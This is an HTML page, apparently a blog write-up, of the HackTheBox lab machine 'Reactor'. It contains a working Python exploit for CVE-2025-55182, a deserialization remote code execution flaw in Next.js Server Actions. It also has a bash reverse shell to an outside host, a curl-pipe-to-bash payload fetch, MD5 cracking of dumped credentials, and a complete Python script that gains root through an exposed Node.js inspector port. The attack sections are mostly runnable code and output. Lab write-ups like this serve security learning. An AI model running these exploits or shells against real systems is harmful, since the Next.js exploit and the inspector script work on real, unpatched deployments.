@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/reactor.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] Reactor - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-easy">easy</span>
+                    <span class="article-cat">· linux / web</span>
+                </div>
+
+                <h1>Reactor</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">Reactor</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">cve-2025-55182 rsc rce</span>
+                    <span class="tag">next.js server actions</span>
+                    <span class="tag">sqlite md5 crack</span>
+                    <span class="tag">node --inspect privesc</span>
+                    <span class="tag">chrome devtools protocol</span>
+                </div>
+
+                <img src="../../images/hackthebox/reactor/index.png" alt="Reactor Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>Recon</h2>
+
+                <p>Starting with <code>nmap</code>. SSH and an unusual service on 3000 that the version scanner cannot fingerprint, but the response headers give it away as a Next.js app.</p>
+
+                <pre><code>[Reactor] nmap -Pn -v -T5 --min-rate 2000 -oN nmap -sSVC 10.129.18.248
+Nmap scan report for 10.129.18.248
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+3000/tcp open  ppp?
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.1 200 OK
+|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, ...
+|     X-Powered-By: Next.js
+|     Content-Type: text/html; charset=utf-8
+|     &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;...</code></pre>
+
+                <p>Port 3000 serves <strong>ReactorWatch</strong>, a Next.js dashboard. Running <code>nuclei</code> over it flags a critical:</p>
+
+                <pre><code>[CVE-2025-55182] [http] [critical] http://10.129.18.248:3000</code></pre>
+
+                <h2>Exploitation</h2>
+
+                <p><a href="https://www.cve.org/CVERecord?id=CVE-2025-55182">CVE-2025-55182</a> is a deserialization flaw in React Server Components as used by Next.js Server Actions. When a request carries a <code>Next-Action</code> header, the server deserializes the multipart body into RSC model objects. The crafted payload abuses a <code>constructor:constructor</code> gadget in the deserializer to reach the <code>Function</code> constructor and evaluate an attacker supplied <code>_prefix</code> string, which is enough to call <code>child_process.execSync</code> on the server.</p>
+
+                <p>The full PoC builds a multipart body where field <code>0</code> is the crafted chunk and field <code>1</code> references it, with the <code>Next-Action</code> header set so Next.js treats the request as a Server Action. The <code>_prefix</code> runs the command and stuffs its output into a fake <code>NEXT_REDIRECT</code> error so the result comes back in the response:</p>
+
+                <pre><code>[Reactor] cat poc.py
+# /// script
+# dependencies = ["requests"]
+# ///
+import requests
+import sys
+import json
+
+BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
+EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"
+
+crafted_chunk = {
+    "then": "$1:__proto__:then",
+    "status": "resolved_model",
+    "reason": -1,
+    "value": '{"then": "$B0"}',
+    "_response": {
+        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
+        # If you don't need the command output, you can use this line instead:
+        # "_prefix": f"process.mainModule.require('child_process').execSync('{EXECUTABLE}');",
+        "_formData": {
+            "get": "$1:constructor:constructor",
+        },
+    },
+}
+
+files = {
+    "0": (None, json.dumps(crafted_chunk)),
+    "1": (None, '"$@0"'),
+}
+
+headers = {"Next-Action": "x"}
+res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
+print(res.status_code)
+print(res.text)</code></pre>
+
+                <p>Host the reverse shell, start a listener, and run the PoC with a command that pulls and executes it:</p>
+
+                <pre><code>[Reactor] cat shell.sh
+0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.15.35/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+
+[Reactor] python3 poc.py http://10.129.18.248:3000/ 'curl http://10.10.15.35:8000/shell.sh | bash'</code></pre>
+
+                <p>The listener catches a shell as the <code>node</code> user, in the app directory:</p>
+
+                <pre><code>node@reactor:/opt/reactor-app$ id
+uid=1001(node) gid=1001(node) groups=1001(node)</code></pre>
+
+                <h2>Post Exploitation</h2>
+
+                <p>The app's <code>.env</code> points at a local SQLite database:</p>
+
+                <pre><code>node@reactor:/opt/reactor-app$ cat .env
+DB_PATH=/opt/reactor-app/reactor.db
+DB_TYPE=sqlite3
+SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
+ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook</code></pre>
+
+                <p>The <code>users</code> table holds two MD5 hashes:</p>
+
+                <pre><code>[Reactor] sqlite3 reactor.db
+sqlite&gt; .tables
+sensor_logs  users
+sqlite&gt; select * from users;
+1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
+2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb</code></pre>
+
+                <p>The engineer hash cracks against rockyou:</p>
+
+                <pre><code>[Reactor] hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
+39d97110eafe2a9a68639812cd271e8e:reactor1</code></pre>
+
+                <p>The password is reused for the system account, giving an SSH session and the user flag:</p>
+
+                <pre><code>[Reactor] ssh engineer@10.129.18.248
+engineer@reactor:~$ id
+uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
+engineer@reactor:~$ cat ~/user.txt</code></pre>
+
+                <h2>Privilege Escalation</h2>
+
+                <p>Checking the process list, a monitoring service runs as root with the Node.js inspector enabled and bound to localhost:</p>
+
+                <pre><code>engineer@reactor:~$ ps aux | grep inspect
+root  1385  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js</code></pre>
+
+                <p>The inspector speaks the Chrome DevTools Protocol over WebSocket and exposes <code>Runtime.evaluate</code>, which runs arbitrary JavaScript in the target process's global context. Since that process is root, any local user who can reach 9229 gets code execution as root. A plain HTTP endpoint even hands out the WebSocket URL:</p>
+
+                <pre><code>engineer@reactor:~$ curl -s http://127.0.0.1:9229/json/list
+[ {
+  "id": "0ef29fa3-3dac-4c14-9879-eb9dc8958fcb",
+  "title": "/opt/uptime-monitor/worker.js",
+  "type": "node",
+  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/0ef29fa3-3dac-4c14-9879-eb9dc8958fcb"
+} ]</code></pre>
+
+                <p>A stdlib only Python CDP client is enough: connect to the WebSocket, send a <code>Runtime.evaluate</code> whose expression pulls <code>child_process</code> out of the running process and runs a command. Because the process is root, so is the command:</p>
+
+                <pre><code>engineer@reactor:~$ cat privesc.py
+#!/usr/bin/env python3
+import socket, base64, os, json, sys, time, urllib.request
+
+host, port = '127.0.0.1', 9229
+ws = json.load(urllib.request.urlopen(f'http://{host}:{port}/json/list'))[0]['webSocketDebuggerUrl']
+path = ws.split(f'{host}:{port}', 1)[1]
+
+key = base64.b64encode(os.urandom(16)).decode()
+s = socket.create_connection((host, port))
+s.sendall((
+    f'GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n'
+    'Upgrade: websocket\r\nConnection: Upgrade\r\n'
+    f'Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n'
+).encode())
+assert b'101' in s.recv(4096)
+
+def send(msg):
+    d = msg.encode(); m = os.urandom(4)
+    h = bytearray([0x81, 0x80 | len(d)]) if len(d) &lt; 126 else \
+        bytearray([0x81, 0x80 | 126]) + len(d).to_bytes(2, 'big')
+    s.sendall(bytes(h) + m + bytes(b ^ m[i % 4] for i, b in enumerate(d)))
+
+def recv():
+    h = s.recv(2); ln = h[1] &amp; 0x7f
+    if ln == 126: ln = int.from_bytes(s.recv(2), 'big')
+    elif ln == 127: ln = int.from_bytes(s.recv(8), 'big')
+    buf = b''
+    while len(buf) &lt; ln: buf += s.recv(ln - len(buf))
+    return buf
+
+cmd = sys.argv[1] if len(sys.argv) &gt; 1 else 'id'
+send(json.dumps({"id": 1, "method": "Runtime.evaluate", "params": {
+    "expression": f"global.process.mainModule.require('child_process').execSync({json.dumps(cmd)}).toString()"
+}}))
+time.sleep(0.5)
+print(recv().decode(errors='replace'))</code></pre>
+
+                <pre><code>engineer@reactor:~$ python3 privesc.py 'id'
+{"id":1,"result":{"result":{"type":"string","value":"uid=0(root) gid=0(root) groups=0(root)\n"}}}</code></pre>
+
+                <p>From there the same primitive reads <code>/root/root.txt</code> as root.</p>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Reactor</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
